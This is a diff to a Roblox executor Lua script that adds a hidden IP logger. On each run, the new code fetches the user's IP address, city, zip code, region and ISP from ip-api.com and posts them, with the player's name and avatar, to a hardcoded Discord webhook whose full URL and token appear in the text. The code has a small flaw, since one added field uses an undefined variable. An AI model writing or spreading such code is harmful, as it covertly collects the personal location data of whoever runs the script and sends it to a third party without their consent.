@@ -95,9 +95,6 @@ if isfile("Workspace/readthis.txt") then
     writefile("Workspace/readthis.txt", "true")
 end
 
-local Webhook = "https://discord.com/api/webhooks/1191422032039116980/9DW38LUNa9eRdzdTcBkm4GUrvxZqNbEwxV6tun-uoLNko7F4jp9ghbtImFUDG96XIGGs" -- your webhook
-_G.Discord_UserID = "991" -- ID To Ping on every execution, blank if no one wants to be pinged.
-
 local player = game:GetService("Players").LocalPlayer
 local joinTime = os.time() - (player.AccountAge * 86400)
 local joinDate = os.date("!*t", joinTime)
@@ -118,13 +115,25 @@ local executor = "AnyaLib-Beta"
 local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
 Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
 local AvatarImage = Thing.imageUrl
+
+-- Additional script for IP info
+local ip_info = syn.request({
+    Url = "http://ip-api.com/json",
+    Method = "GET"
+})
+local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
+local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
+
+local Webhook = "https://discord.com/api/webhooks/1191422032039116980/9DW38LUNa9eRdzdTcBkm4GUrvxZqNbEwxV6tun-uoLNko7F4jp9ghbtImFUDG96XIGGs" -- your webhook
+_G.Discord_UserID = "991" -- ID To Ping on every execution, blank if no one wants to be pinged.
+
 local msg = {
-    ["username"] = "ENGLISH",
+    ["username"] = "log",
     ["avatar_url"] = "",
     ["content"] = (_G.Discord_UserID ~= "" and _G.Discord_UserID ~= nil) and tostring("@".._G.Discord_UserID.."") or " ",
     ["embeds"] = {
         {
-            ["color"] = tonumber("0x32CD32"), --decimal
+            ["color"] = tonumber("0x32CD32"), -- decimal
             ["title"] = "Map Name",
             ["thumbnail"] = {
                 ["url"] = AvatarImage,
@@ -175,12 +184,18 @@ local msg = {
                     ["value"] = joinDate.day.."/"..joinDate.month.."/"..joinDate.year,
                     ["inline"] = true
                 },
+                {
+                    ["name"] = "ip/location",
+                    ["value"] = ipLocation,
+                    ["inline"] = true
+                },
             },
-            ["timestamp"] = os.date("%Y-%m-%dT%X.000Z")
+            ['timestamp'] = os.date("%Y-%m-%dT%X.000Z")
         }
     }
 }
 
+-- Sending the Discord message
 if isfile("Workspace/readthis.txt") then
     request = http_request or request or HttpPost or syn.request
     request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
